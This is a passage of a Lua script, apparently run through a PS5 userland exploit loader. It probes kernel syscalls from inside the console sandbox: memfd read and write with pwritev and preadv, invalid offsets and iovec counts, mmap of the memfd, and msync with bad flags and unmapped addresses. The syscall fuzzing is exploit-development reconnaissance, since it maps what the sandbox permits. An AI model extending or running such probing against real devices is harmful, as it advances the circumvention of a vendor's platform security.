    local iov = memory.alloc(16)
    memory.write_qword(iov, wbuf)
    memory.write_qword(iov + 8, 8)
    report("pwritev(mfd, off=0x8000)", function()
        return syscall.sc_pwritev(mfd, iov, 1, 0x8000)
    end)

    -- read back via preadv
    local rbuf = memory.alloc(16)
    for i = 0, 15 do memory.write_byte(rbuf + i, 0) end
    memory.write_qword(iov, rbuf)
    memory.write_qword(iov + 8, 8)
    report("preadv(mfd, off=0x8000)", function()
        return syscall.sc_preadv(mfd, iov, 1, 0x8000)
    end)
    local hex = ""
    for i = 0, 7 do hex = hex .. string.format("%02x", memory.read_byte(rbuf + i):tonumber()) end
    print("  readback: " .. hex)

    -- preadv at huge offset (validation check)
    report("preadv(mfd, off=2^62)", function()
        return syscall.sc_preadv(mfd, iov, 1, 0x4000000000000000)
    end)
    -- negative offset
    report("preadv(mfd, off=-1)", function()
        return syscall.sc_preadv(mfd, iov, 1, -1)
    end)
    -- iovlen abuse
    report("preadv(mfd, iovlen=0)", function() return syscall.sc_preadv(mfd, iov, 0, 0) end)
    report("preadv(mfd, iovlen=-1)", function() return syscall.sc_preadv(mfd, iov, -1, 0) end)
    report("preadv(mfd, iovlen=1025)", function() return syscall.sc_preadv(mfd, iov, 1025, 0) end)

    -- mmap the memfd (shared) — does PS5 allow mapping memfd?
    local ok_mm, rv_mm = pcall(function()
        return syscall.sc_mmap(0, 0x10000, 3, 0x0001, mfd, 0)  -- RW, MAP_SHARED
    end)
    local maddr = 0
    if ok_mm then
        local okn, n = pcall(function() return rv_mm:tonumber() end)
        maddr = okn and n or 0
    end
    print(string.format("mmap(memfd SHARED): 0x%x", maddr))
else
    print("memfd fd looks fake (<=2) — sandbox stub")
end

-- ---------------------------------------------------------------
-- PART 2: msync isolated (probe 38 died at minherit before reaching it)
-- ---------------------------------------------------------------
print("")
print("--- PART 2: msync isolated ---")
print("(if loader dies here, msync was the second probe-30 killer)")
local region = memory.alloc(0x4000)
local raddr = 0
local okr, nrr = pcall(function() return region:tonumber() end)
raddr = okr and nrr or 0
print(string.format("region @ 0x%x", raddr))
report("msync(MS_SYNC=0)", function() return syscall.sc_msync(region, 0x4000, 0) end)
report("msync(MS_INVALIDATE=2)", function() return syscall.sc_msync(region, 0x4000, 2) end)
report("msync(MS_ASYNC=1)", function() return syscall.sc_msync(region, 0x4000, 1) end)
report("msync(bad flag 0x100)", function() return syscall.sc_msync(region, 0x4000, 0x100) end)
report("msync(len=0)", function() return syscall.sc_msync(region, 0, 0) end)
report("msync(unmapped)", function() return syscall.sc_msync(region + 0x100000, 0x4000, 0) end)

print("=== 42b DONE ===")
```
